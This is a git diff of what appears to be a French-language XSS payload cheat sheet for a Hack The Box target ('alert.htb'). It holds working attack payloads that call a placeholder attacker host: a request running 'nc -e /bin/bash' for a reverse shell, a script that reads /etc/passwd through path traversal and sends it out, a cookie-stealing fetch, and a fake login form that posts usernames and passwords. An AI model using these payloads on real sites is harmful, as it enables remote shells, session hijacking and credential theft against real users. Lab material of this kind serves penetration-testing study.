@@ -157,11 +157,11 @@ fetch("http://alert.htb/admin/run?cmd=nc -e /bin/bash TON_IP TON_PORT", { creden
 📌 Fonctionne si l’admin a plus de privilèges et que l'application a une page de gestion de commandes.
 
 
-
+----------LIF avec XSS----------
 
 <script>
     var url = "messages.php?file=../../../../../../../etc/passwd"
-    var attacker = "http://<your-ip-address>:4444/exfil"
+    var attacker = "http://ton_ip:ton_port/exfil"
     var xhr = new XMLHttpRequest()
     xhr.onreadystatechange = function () {
       if (xhr.readyState == XMLHttpRequest.DONE) {
@@ -173,10 +173,22 @@ fetch("http://alert.htb/admin/run?cmd=nc -e /bin/bash TON_IP TON_PORT", { creden
 </script>
 
 
+------------vol de cookies-------------
+
 <script>
-fetch('http://your_ip:your_port', {
+fetch('http://ton_ip:ton_port', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
 });
 </script>
+
+
+--------------vol de mot de passe--------------
+
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('http://ton_ip:ton_port',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
